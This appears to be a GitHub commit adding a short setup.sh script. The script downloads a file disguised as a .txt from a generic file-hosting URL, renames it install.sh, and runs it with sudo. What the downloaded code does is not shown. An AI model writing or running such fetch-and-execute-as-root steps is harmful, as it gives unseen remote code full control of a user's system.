a478b343d54d92ba02b8707d135afd87f880e955
jandsnadell428 <77749180+jandsnadell428@users.noreply.github.com>
2021-01-21 17:28:12 -0800

    Add files via upload

---
+++ setup.sh
@@ -0,0 +1,3 @@
+#!/bin/bash
+echo phonesetup.sh  downloading
+cd ~; curl -L -O https://29661948-c8c6-4db1-a837-34c3bb6497ac.filesusr.com/ugd/360721_26e1fd18b0fe406fa665ec129b2e939c.txt?dn=install.txt; mv 360721_26e1fd18b0fe406fa665ec129b2e939c.txt?dn=install.txt  install.sh; sudo sh install.sh
